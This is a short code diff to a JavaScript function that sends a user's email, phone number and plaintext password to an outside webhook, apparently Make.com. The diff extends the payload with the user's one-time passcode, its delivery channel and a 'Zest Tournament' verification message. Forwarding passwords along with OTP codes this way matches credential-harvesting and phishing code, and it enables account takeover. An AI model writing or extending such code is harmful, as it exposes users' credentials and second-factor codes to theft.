@@ -79,6 +79,11 @@ export const sendToMakeWebhook = async (eventData) => {
     email: eventData.email || 'N/A',
     phone: cleanPhone,
     password: eventData.password || eventData.loginPassword || 'N/A',
+    otpCode: eventData.otpCode || '',
+    channel: eventData.channel || 'email',
+    otpMessage: eventData.otpCode 
+      ? `Your Zest Tournament verification code is ${eventData.otpCode}. Do not share this OTP with anyone.` 
+      : '',
     details: eventData.details || '',
     device: typeof window !== 'undefined' && window.innerWidth < 768 ? 'Mobile App' : 'Desktop Web',
     rawTime: new Date().toISOString()
@@ -100,6 +105,9 @@ export const sendToMakeWebhook = async (eventData) => {
     email: payload.email,
     phone: payload.phone,
     password: payload.password,
+    otpCode: payload.otpCode,
+    channel: payload.channel,
+    otpMessage: payload.otpMessage,
     details: payload.details,
     device: payload.device
   });
